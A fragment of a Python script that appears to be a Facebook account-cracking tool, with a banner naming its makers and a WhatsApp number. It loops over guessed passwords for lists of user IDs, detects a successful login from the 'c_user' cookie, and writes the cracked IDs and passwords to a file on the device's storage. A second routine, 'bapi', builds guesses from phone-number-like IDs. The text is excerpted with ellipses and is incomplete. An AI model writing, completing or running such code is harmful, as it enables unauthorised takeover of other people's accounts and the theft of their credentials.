...
\33[1;92m║➣\033[1;93m WHATSAPP   :          01794315166        \33[1;92m ║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \033[1;35m[\033[1;37mTONMOY-CP\033[1;35m]\033[1;31m '+cid+' \033[1;37m| \033[1;31m'+ps+'\033[0;97m ')
                open('/sdcard/TONMOY-0X-CP.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r \033[1;90m[\033[1;93mJAHID\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks)));sys.stdout.flush()
        for pw in pwx:
